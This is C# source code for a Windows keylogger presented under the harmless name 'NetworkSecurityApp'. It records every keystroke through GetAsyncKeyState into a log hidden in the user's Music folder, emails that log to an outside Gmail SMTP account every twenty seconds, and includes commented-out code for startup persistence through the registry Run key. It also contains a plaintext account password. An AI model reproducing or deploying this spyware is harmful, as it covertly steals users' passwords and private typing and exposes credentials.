using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;
using Microsoft.Win32;

namespace NetworkSecurityApp
{

    public partial class App : System.Windows.Application
    {
        private static Object locker = new Object();
        private static Thread loggerT;
        private static Thread mailerT;
        private static System.Threading.Timer timer;

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [STAThread]
        static void Main(String[] args)
        {
            //The path to the key where Windows looks for startup applications
            //RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            // Add the value in the registry so that the application runs at startup
            //rkApp.SetValue("NetworkSecurityApp", Application.ExecutablePath.ToString());


            Thread.CurrentThread.Name = "MainTread";
            loggerT = new Thread(LogKeys);
            loggerT.Name = "logger";
            int i = 0;

             timer = new System.Threading.Timer((e) =>
            {
                Thread.CurrentThread.Name = "TimerTread";
                Console.WriteLine("TIMER END");
                SendMail(i); 
                i++;
            }, null, TimeSpan.FromSeconds(20), TimeSpan.FromSeconds(20));

            loggerT.Start();
            var application = new App();
            application.InitializeComponent();
            application.Run();

        }

        public static void LogKeys()
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            filepath = filepath + @"\Songs\";
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (@filepath + "ReadMe.text");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
             
            }
            KeysConverter converter = new KeysConverter();
            string text = "";
            while (true)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 357; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == -32767)
                    {                
                        lock (locker)
                        {
                            text = converter.ConvertToString(i);
                            Console.WriteLine("From LOG Pressed:  {0}", text);
                            Thread.Sleep(10);
                            using (StreamWriter sw = File.AppendText(path))
                            {
                                switch (text)
                                {
                                    case "Space": sw.Write("[space]");
                                        break;
                                    case "LButton":
                                        sw.WriteLine("[LButton]");
                                        break;
                                    case "RButton":
                                        sw.WriteLine("[RButton]");
                                        break;
                                    case "Menu":
                                        sw.WriteLine("[alt]");
                                        break;
                                    case "LControlKey":
                                        sw.WriteLine("[Ctrl]");
                                        break;
                                    case "ControlKey":
                                        sw.Write("");
                                        break;
                                    case "Tab":
                                        sw.Write("[Tab]");
                                        break;
                                    case "Enter": sw.WriteLine("\n");
                                        break;
                                    case "P":
                                        sw.WriteLine(Application.ExecutablePath.ToString());
                                        break;
                                    default: sw.Write(text);
                                        break;
                                }
                            }
                        }
                        Console.WriteLine("From Log: END OF LOCK");
                        break;
                    }
                }
            }
        }


        static void SendMail(int i)
        {
            Console.WriteLine("GOT IN TO SEND MAIL");
            String Newfilepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            string Newfilepath2 = Newfilepath + @"\Songs\ReadMe.text"; 

            DateTime dateTime = DateTime.Now; 
            string subtext = "Loggedfiles"; 
            subtext += dateTime;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587); 
            MailMessage LOGMESSAGE = new MailMessage();
            LOGMESSAGE.From = new MailAddress("omribeni@post.bgu.ac.il"); 
            LOGMESSAGE.To.Add("omribeni@post.bgu.ac.il"); 
            LOGMESSAGE.Subject = subtext; 

            client.UseDefaultCredentials = false;      
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("omribeni@post.bgu.ac.il", "oM__1990");
 
            lock (locker)
            {
                Console.WriteLine("From SendMail - Thread Name: {0}", Thread.CurrentThread.Name);
 
                string newfile = File.ReadAllText(Newfilepath2);
                string attachmenttextfile =
                    Newfilepath + @"\Songs\temptxtfile"+ i +".text";
                File.WriteAllText(attachmenttextfile, newfile); 
                Thread.Sleep(2);
                LOGMESSAGE.Attachments.Add(new Attachment(attachmenttextfile)); 
                LOGMESSAGE.Body = subtext; 
                client.Send(LOGMESSAGE); 
                LOGMESSAGE = null;

                //Thread.Sleep(10);
            
                    File.WriteAllText(Newfilepath2,"");
                

            }
            Console.WriteLine(@"Finished Sending Mail");
        }

        //var application = new App();
        //application.InitializeComponent();
        //application.Run();
    }
}
